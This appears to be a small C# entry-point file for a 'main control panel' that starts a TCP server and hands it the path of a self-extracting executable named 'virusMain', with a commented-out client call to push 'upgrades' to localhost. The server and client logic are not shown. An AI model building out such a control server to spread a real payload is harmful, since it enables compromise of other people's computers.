using System.Threading;
using System;

namespace MainControllPannel
{
    class MainClass
    {
        static void Main()
        {
            TcpServer serv = new TcpServer();
            Thread t1 = new Thread(() => { serv.CheckAnswers(serv.StartServer(), @"C:\test228\virusMain.sfx.exe"); });
            t1.Start();
            
            //TcpClient tcpcl = new TcpClient();
            //tcpcl.UpgradeMyWorks(@"C:\test228\virusMain.sfx.exe", "127.0.0.1");




            //throw new Exception("No network adapters with an IPv4 address in the system!");
        }
    }
}
